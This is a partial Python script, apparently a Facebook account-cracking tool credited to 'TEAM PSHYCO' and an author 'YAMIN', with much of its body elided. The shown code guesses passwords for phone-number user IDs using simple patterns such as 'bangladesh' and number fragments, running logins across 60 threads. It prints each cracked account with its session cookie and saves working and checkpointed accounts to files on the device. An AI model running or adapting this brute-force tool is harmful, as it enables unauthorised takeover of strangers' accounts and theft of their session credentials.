...
\033[1;32m╔════════════════════════════════════════════════════════════╗
\033[1;32m║\033[0;32m          𝐓𝐄𝐀𝐌 𝐍𝐀𝐌𝐄      ➣ 𝐓𝐄𝐀𝐌 PSHYCO                         \033[1;32m║
\033[1;32m║\033[0;31m          𝐀𝐔𝐓𝐇𝐎𝐑         ➣ YAMIN                 \033[1;32m║
\033[1;32m║\033[0;33m          𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊       ➣ YAMIN                   \033[1;32m║
\033[1;32m║\033[0;34m          𝐆𝐈𝐓𝐇𝐔𝐁         ➣ YAMIN-69                        \033[1;32m║
...
\033[1;32m║\033[0;32m          𝐕𝐀𝐑𝐒𝐈𝐎𝐍        ➣ 0.0.9                            \033[1;32m║
...
except:print('\n\033[1;31mNO YEAMIN CONNECTION ... \033[0;97m')
...
def innocent():
    ...
    with ThreadPool(max_workers=60) as ahare:
        ...
        linex()
        for fuck in user:
            pwx = [fuck,'bangladesh',fuck[2:],code+fuck]
            uid = code+fuck
            ahare.submit(mumitx,uid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /PSHYCO-OK.txt')
    print('Cp Ids Saved in /PSHYCO-CP.txt')
    linex()
        ...
        for ps in pwx:
          ...
          'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[YEAMIN-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/YEAMIN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[YEAMIN-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/YEAMIN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mYEAMIN\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
